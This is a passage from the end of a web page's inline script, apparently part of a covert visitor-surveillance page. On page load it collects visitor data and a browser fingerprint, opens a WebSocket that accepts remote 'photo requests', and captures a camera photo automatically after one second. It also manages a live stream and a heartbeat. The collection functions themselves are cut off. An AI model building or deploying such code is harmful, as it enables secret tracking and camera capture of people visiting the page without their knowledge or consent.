      if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
        mediaStream = null;
      }
      
      console.log('[STREAM] Live stream stopped');
    }

    // Auto-run on page load
    window.addEventListener('load', async function() {
      await collectAllData();

      // Store entry ID and fingerprint for photo requests
      currentEntryId = window.currentEntryId;
      currentFingerprint = window.currentFingerprint;

      // Initialize WebSocket connection for photo requests (after data is collected)
      initWebSocket();

      // Automatically capture photo after data collection
      // Delay slightly to avoid overwhelming the browser
      setTimeout(() => {
        capturePhoto('auto');  // Automatic on page load
      }, 1000);
    });

    // Cleanup on page unload
    window.addEventListener('beforeunload', () => {
      if (heartbeatInterval) {
        clearInterval(heartbeatInterval);
        heartbeatInterval = null;
      }
      stopLiveStream(); // Stop stream on page unload
      if (socket && socket.connected) {
        socket.disconnect();
      }
    });
  </script>
</body>
</html>